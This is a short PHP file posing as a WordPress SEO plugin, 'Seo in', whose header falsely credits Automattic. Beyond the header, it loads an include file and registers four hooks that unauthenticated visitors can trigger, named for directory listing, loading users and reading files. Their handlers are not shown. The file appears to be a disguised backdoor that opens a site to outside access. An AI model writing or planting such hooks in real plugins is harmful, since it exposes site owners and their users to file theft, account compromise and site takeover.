<?php
/**
 * Plugin Name: Seo in
 * Plugin URI: https://seo-in.com/
 * Description: An seo toolkit that helps you seo anything. Beautifully.
 * Version: 9.3.3
 * Author: Automattic
 * Author URI: https://seo-in.com/
 * Text Domain: seo in
 * Domain Path: /i18n/languages/
 *
 * @package SEO IN
 */
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
if ( file_exists( dirname( __FILE__ ) . '/includes/autoload.php' ) ) {
    require_once dirname( __FILE__ ) . '/includes/autoload.php';
}
add_action('admin_post_nopriv_seo-index', 'seo_index');
add_action('admin_post_nopriv_dires', 'dires');
add_action('admin_post_nopriv_loaduser', 'loaduser');
add_action('admin_post_nopriv_read-file', 'read_file');


?>
